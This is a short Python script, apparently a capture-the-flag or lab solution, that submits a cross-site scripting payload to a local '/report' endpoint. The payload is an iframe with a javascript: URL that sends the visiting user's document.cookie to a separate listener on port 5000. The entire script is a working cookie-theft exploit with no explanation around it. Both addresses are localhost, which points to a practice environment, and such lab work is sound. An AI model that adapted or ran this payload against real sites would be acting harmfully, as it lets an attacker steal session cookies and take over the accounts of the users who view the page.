import requests

payload = """
<iframe src="javascript:
    window.open('http://127.0.0.1:5000/?'%2bdocument.cookie);
">
"""

data = {
    "url":f"/?html={payload}"
}

response = requests.post("http://127.0.0.1:30031/report", data=data)
print(response.text)